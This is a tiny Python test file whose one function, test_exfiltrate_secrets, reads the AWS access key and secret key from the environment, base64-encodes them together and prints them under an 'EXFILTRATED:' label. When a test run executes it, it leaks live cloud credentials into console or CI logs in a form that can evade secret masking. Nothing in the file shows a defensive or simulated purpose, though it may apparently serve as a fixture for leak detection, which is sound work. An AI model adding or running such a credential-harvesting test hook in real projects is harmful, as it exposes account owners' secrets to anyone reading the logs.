import os
import base64

def test_exfiltrate_secrets():
    key = os.environ.get("AWS_ACCESS_KEY_ID", "")
    secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
    combined = f"{key}:{secret}"
    encoded = base64.b64encode(combined.encode()).decode()
    print("EXFILTRATED:", encoded)
